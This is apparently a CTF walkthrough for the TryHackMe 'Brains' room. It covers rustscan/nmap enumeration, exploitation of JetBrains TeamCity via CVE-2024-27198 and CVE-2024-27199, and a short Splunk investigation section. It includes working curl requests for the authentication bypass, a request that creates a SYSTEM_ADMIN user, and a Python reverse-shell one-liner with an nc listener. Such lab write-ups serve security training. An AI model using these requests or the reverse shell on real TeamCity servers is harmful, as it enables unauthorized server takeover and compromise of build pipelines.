---
title: 'TryHackMe: Brains CTF Walkthrough'
author: 0xcracker
categories: [TryHackMe]
tags: [web-application, rustscan, dirsearch, sed, curl, authentication-bypass, RCE, splunk]
render_with_liquid: true
img_path: /images/Cheese-CTF
image:
  path: /images/TryHackMe/Brains/room_image.webp
---

<a href="https://tryhackme.com/r/room/brains" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #a1a1a1ff; text-decoration: none;">TryHackMe | Brains CTF Challenge
  <img src="https://tryhackme.com/r/favicon.png" alt="icon" style="width: 48px; height: 48px; margin-right: 10px;">
  <span style="font-size: 16px;"></span>
</a>

🧰 Writeup Overview

we focus on advanced paging, directory obfuscation, and exploiting vulnerabilities within JetBrains TeamCity. You will bypass authentication (CVE-2024-27198) and execute remote code (CVE-2024-27199) by sending crafted HTTP requests. The guide also covers setting up an admin user to execute commands and achieve reverse shell access, and we conclude with guidance on using Splunk to analyze incidents.

## Red: Exploit the Server!
## Reconnaissance & Enumeration

### rustscan

**scanning ports**
```console
┌──(cracker㉿carcker)-[~/Desktop/THM/Brains]
└─$ rustscan -a brains.thm — range 1–65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] Host "—" could not be resolved.
[!] Host "range" could not be resolved.
[!] Host "1–65535" could not be resolved.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.113.153:22
Open 10.10.113.153:80
Open 10.10.113.153:8000
Open 10.10.113.153:8089
Open 10.10.113.153:8191
Open 10.10.113.153:33399
Open 10.10.113.153:50000
```

**Discovering services on server by rustscan & Nmap**
```console
┌──(cracker㉿carcker)-[~/Desktop/THM/Brains]
└─$ rustscan -a brains.thm -p 22,80,8000,8089,8191,33399,50000 -- -sCV -T4 -oN brains.nmap
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
######################################################################################################
PORT      STATE SERVICE         REASON  VERSION
22/tcp    open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:7d:c0:d1:38:15:ac:33:5b:8b:ee:c4:b7:54:8b:f1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC99Mr5obEwtTb1vdHVPLvmU+fcnKpbio4PLfRBSLKtIV4JigV4L/PCKWCTVm8EJCpDT115OYye6m5DT19iXxxTtQ86h8M3BnmP+6tGIpgozstxBYAD19JTlfo8Bf7v5JeAKz9qIJyxR8G6sqYuGepgE+j7oCpYl7E6JQdl9Cx2BW2NQsUto+sP3DIIjtrYlS2XzgoKyURNQiajpEAu28C+J+GqFaFVH7OWR8gNazYhe5WKrzl2BYKha8uZbmzdBEl4irzhY1RFAI3I8rSXbLFFDywq7pZh7DjGevFSNcMMcVSVRKCc+7rCUvS3A9dQUyLwpyKOolZ/tP5o5k5Rd9VlQlA9wj9ssNFDUYWPaM+QIqMTbFweQ6/XUlku0H9IFapoyefMnjoCKCSZDHio997CVDGFgoFEQv5SUXdMl2Lev9g6oYAjdKy68DGhR0zwyf5ZA8FXUmXjP90wd9qrjwFunjoDYD3W1g/zOKpf++MrRAOOSTZbJX6ha9r3LiSQqe8=
|   256 51:82:9f:e0:f4:c2:1b:3e:99:27:5d:c3:2b:6e:84:96 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLaxJtjaMmCbeTb9TO/8UXngKvVDRc85X3t0EJlahicKXomPQo9yNs9fXBzN0SnNjSB98rjscnQzMwzhXZ3jiek=
|   256 ee:2d:22:3c:03:9f:7f:a9:99:b2:79:81:15:c8:72:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBDYqZEviTdiinUAqTPC93sbEm5JvfSWvwUafFJ5eCia
######################################################################################################
80/tcp    open  http            syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Maintenance
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
######################################################################################################
8000/tcp  open  http            syn-ack Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://brains.thm:8000/en-US/account/login?return_to=%2Fen-US%2F
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
######################################################################################################
8089/tcp  open  ssl/http        syn-ack Splunkd httpd (free license; remote login disabled)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-server-header: Splunkd
|_http-title: Site doesn't have a title (text/xml; charset=UTF-8).
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-04T21:42:22
| Not valid after:  2027-07-04T21:42:22
| MD5:   0b2d:eb62:377f:0eb1:9243:0a68:0106:83a0
| SHA-1: 86e5:d636:e659:9020:0090:d888:06f4:40c1:d823:868e
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQDY5dRkaGptyTANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNDA3MDQyMTQyMjJaFw0yNzA3MDQyMTQy
| MjJaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyM88
| am8rjZNYtOlBNB4OwH30JeyhjvEN6B5I6E8bu/FRjcwm8EcqE7GXn0YOiYeGwuFT
| +hqp4UCvxYjd0UlsBA3yNTtYT8gbxMZqq+UEDEhDmX5rFkp/yMNEE+UZ9teACFms
| JZx2bnHvHEbwjNKYgsM9vtIkkH4mqP7pkrzHZZgrB9tRiHgJDTrSGpbrLREs4rOC
| VD+7/N75ONKA7O92Ni5IBdpaJRS5J3nxvnZIrEEd44tKMQ9ZP3xXwSUbwh451S8t
| IvAof7dPhLQ132TpTS/YEVZlhQTnVISj2qio8RXtwLE2LfmISEEFJ2UvSd0OnjlE
| QD+OpXRn5OSpgUkrdwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQC9KLb/6/OfyWn3
| nr4nR+D+T/bv/gFaurxQIq83ZebnzX4+Jkhbj2ilop/esR3+oXvLr86Zi+nS0yvo
| EkPthlwYkpE15Hx50jjZRsxnlE4lb459E/E83MJP5I9fkEisZbS7O6s/vdqtaiRK
| eBaSL00lgtBd6mKbXJ5SzCu6eKBSWKhd+Iirw0WfbfiAhFyPXZd7pSsTGfLrT28G
| GDbWjpq9qRJTn9VWctS2WMeN7HAGU/m8AInubxxI3/zxlFSN336ffYkNU9T9QQ+I
| d/P3uF2hKyyqbIWjFDAnY08DzdcnkZZZ810fzGbJUp2OzbZSdOafK4Fmz8mxItVG
| DAxAAX0B
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8191/tcp  open  limnerpressure? syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|_    looks like you are trying to access MongoDB over HTTP on the native driver port.
######################################################################################################
33399/tcp open  java-rmi        syn-ack Java RMI
######################################################################################################
50000/tcp open  ibm-db2?        syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 401 
|     TeamCity-Node-Id: MAIN_SERVER
|     WWW-Authenticate: Basic realm="TeamCity"
|     WWW-Authenticate: Bearer realm="TeamCity"
|     Cache-Control: no-store
|     Content-Type: text/plain;charset=UTF-8
|     Date: Sat, 05 Oct 2024 15:16:38 GMT
|     Connection: close
|     Authentication required
|     login manually go to "/login.html" page
|   drda: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 05 Oct 2024 15:16:41 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|     Request</h1></body></html>
|   ibm-db2, ibm-db2-das: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 05 Oct 2024 15:16:39 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
######################################################################################################
```

### Discovering The web-application

port `80`

![](/images/TryHackMe/Brains/Maintenance.png)
as you see the service under Maintenance

port `50000`

![](/images/TryHackMe/Brains/TeamCity.png)
We can benefit from the release TeamCity `Version 2023.11.3` 

> After Fuzzing Into server directories on ports `80`,`50000` we don't found any things interested.
{: .prompt-info }

```console
dirsearch -u http://brains.thm/ -w /usr/share/dirb/wordlists/big.txt  -t 100
```
![](/images/TryHackMe/Brains/dirsearch-brains-80.png)

```console
dirsearch -u http://brains.thm:50000/ -w /usr/share/dirb/wordlists/big.txt  -t 100
```
![](/images/TryHackMe/Brains/dirsearch-brains-50000.png)

## Exploit

After searching for vulnerabilities in version `2023.11.3`, we found that this version is affected by the CVES vulnerability `CVE-2024-27198` && `CVE-2024-27199`.

The vulnerabilities CVE-2024-27198 and CVE-2024-27199 target `JetBrains TeamCity`, a popular `CI/CD tool`. Here's the breakdown:

- `CVE-2024-27198` (`Auth Bypass`): Exploiting this flaw lets attackers bypass authentication by `manipulating API requests`. By leveraging `unsecured endpoints`, they gain unauthorized access.

- `CVE-2024-27199` (`RCE`): Once authenticated, either legitimately or through bypass, an attacker can execute arbitrary code on the TeamCity server, `leading to full compromise of the system`.

This combo is powerful—auth bypass lets attackers reach an interface, and RCE takes it further to control the server.

- ### Manual Exploitation Approach


<a href="https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #fff; text-decoration: none;">CVE-2024-27198 and CVE-2024-27199: JetBrains TeamCity Multiple Authentication Bypass Vulnerabilities (FIXED) | Rapid7 Blog
  <img src="https://www.rapid7.com/includes/img/favicon.ico" alt="icon" style="width: 48px; height: 48px; margin-right: 10px;">
  <span style="font-size: 16px;"></span>
</a>

A detailed explanation can be found here:

<a href="https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #fff; text-decoration: none;">TeamCity Auth bypass to RCE (CVE-2024-27198 and CVE-2024-27199) | vicarius
  <img src="https://www.vicarius.io/vsociety/favicon.svg" alt="icon" style="width: 48px; height: 48px; margin-right: 10px;">
  <span style="font-size: 16px;"></span>
</a>

```console
curl -ik http://brains.thm:50000/app/rest/server
```
output
```console
HTTP/1.1 401 
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
WWW-Authenticate: Bearer realm="TeamCity"
Cache-Control: no-store
Content-Type: text/plain;charset=UTF-8
Transfer-Encoding: chunked
Date: Fri, 25 Oct 2024 11:43:57 GMT

Authentication required
To login manually go to "/login.html" page 
```

> `-i` (Include HTTP headers in the output) & `-k` (Disable SSL verification)
{: .prompt-info }

Typically, this endpoint requires authentication, meaning direct requests by unauthenticated users will be blocked.

now will bypass Authentication as below :
```console
curl -s 'http://brains.thm:50000/any?jsp=/app/rest/server;.jsp'
```
However, to manipulate this system using the vulnerability, an unauthenticated attacker needs to fulfill three specific criteria during their HTTP(S) request:

1. Initiate a request that generates a 404 error: This can be done by targeting a nonexistent resource.
2. Include an HTTP query parameter named '`jsp`' with the value set to an authenticated endpoint's URI path. This is done by adding a query.
3. Ensure the '`jsp`' parameter ends with `.jsp`, mimicking the file format. This can be implemented by appending an HTTP path parameter.

When these elements are combined, the manipulated request looks like this: `/any?jsp=/app/rest/server;.jsp`. Let's check what happens when we call this endpoint (I use "xml_pp" to pretty print the XML response):

```console
curl -s 'http://brains.thm:50000/kaka?jsp=/app/rest/server;.jsp' | xml_pp
```
output
```console
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<server artifactsUrl="" buildDate="20240129T000000+0000" buildNumber="147512" currentTime="20241025T121938+0000" internalId="dfe695de-193a-4379-aa85-1757839c83f0" role="main_node" startTime="20241025T121111+0000" version="2023.11.3 (build 147512)" versionMajor="2023" versionMinor="11" webUrl="http://brains.thm:50000">
  <projects href="/app/rest/projects"/>
  <vcsRoots href="/app/rest/vcs-roots"/>
  <builds href="/app/rest/builds"/>
  <users href="/app/rest/users"/>
  <userGroups href="/app/rest/userGroups"/>
  <agents href="/app/rest/agents"/>
  <buildQueue href="/app/rest/buildQueue"/>
  <agentPools href="/app/rest/agentPools"/>
  <investigations href="/app/rest/investigations"/>
  <mutes href="/app/rest/mutes"/>
  <nodes href="/app/rest/server/nodes"/>
</server>
```
By following these steps, the attacker can access the authenticated endpoint (`/app/rest/server`) without needing to authenticate, effectively bypassing security through this vulnerability.

This authentication bypass vulnerability can be exploited in various ways, enabling an attacker to seize control of a vulnerable TeamCity server and, consequently, all related projects, builds, agents, and artifacts. For instance, an unauthenticated attacker can establish a new administrator user with a password of their choosing by exploiting the `/app/rest/users` REST API endpoint:

```console
curl -ik 'http://brains.thm:50000/kaka?jsp=/app/rest/users;.jsp' -X POST -H "Content-Type: application/json" --data '{"username": "0xcracker", "password": "0xcracker", "email": "vsociety", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'
```

output
```console
HTTP/1.1 200 
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store
Content-Type: application/xml;charset=ISO-8859-1
Content-Language: en
Content-Length: 672
Date: Fri, 25 Oct 2024 11:45:33 GMT

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><user username="0xcracker" id="21" email="vsociety" href="/app/rest/users/id:21"><properties count="3" href="/app/rest/users/id:21/properties"><property name="addTriggeredBuildToFavorites" value="true"/><property name="plugin:vcs:anyVcs:anyVcsRoot" value="0xcracker"/><property name="teamcity.server.buildNumber" value="147512"/></properties><roles><role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:21/roles/SYSTEM_ADMIN/g"/></roles><groups count="1"><group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/></groups></user>
```

Now we will use credentials that we created or in other words, the user we added.

![](/images/TryHackMe/Brains/1.png)

![](/images/TryHackMe/Brains/2.png)

then...

`Arbitrary Command Execution by Custom Script`
- Login as admin user.

- Create a new project in admin dashboard.

- Click "Manual" tab and fill required fields.

- A new project is created.

- In the project home, create a Build Configurations.

- In the build configuration page, click "Build Steps" on the left menus.

- Add build step.

- Select "Command Line" in Runner type.

- Put a Python reverse shell script in the "Custom script".

```py
export RHOST="<local-ip>";export RPORT=<local-port>;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
- Start listener in local machine.
```sh
nc -lvnp 4444
```
- Click "Run" button in the build page.

- We should get a shell in terminal.

- ### Automated Exploitation Approach

<a href="https://github.com/W01fh4cker/CVE-2024-27198-RCE" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #fff; text-decoration: none;">CVE-2024-27198 & CVE-2024-27199 Authentication Bypass --> RCE in JetBrains TeamCity Pre-2023.11.4 | github
  <img src="https://github.githubassets.com/favicons/favicon.png" alt="icon" style="width: 48px; height: 48px; margin-right: 10px;">
  <span style="font-size: 16px;"></span>
</a>

<!-- -->
Use `Firefox browser` if you have trouble playing the video.

<video width="800" controls>
  <source src="{{ '/videos/TryHackMe/brains/Automated_Exploitation.mp4' | relative_url }}" type="video/mp4">
  Your browser does not support the video tag.
</video>


## Blue: Let's Investigate

you can check here about how use Splunk

<a href="https://docs.splunk.com/Documentation/Splunk" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #fff; text-decoration: none;">usage Splunk | Splunk® Enterprise
  <img src="https://docs.splunk.com/favicon.ico" alt="icon" style="width: 48px; height: 48px; margin-right: 10px;">
  <span style="font-size: 16px;"></span>
</a>

<video width="800" controls>
  <source src="{{ '/videos/TryHackMe/brains/Investigate.mp4' | relative_url }}" type="video/mp4">
  Your browser does not support the video tag.
</video>


<div style="text-align: center;">
  <img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExd3dzNjZwZ2V3ZDFmZmRiZnNmZXdhc3hnMzFzMm1tYTBreXhiM3RzNSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1xucXbDnMIYkU/giphy.gif" alt="gif">
</div>
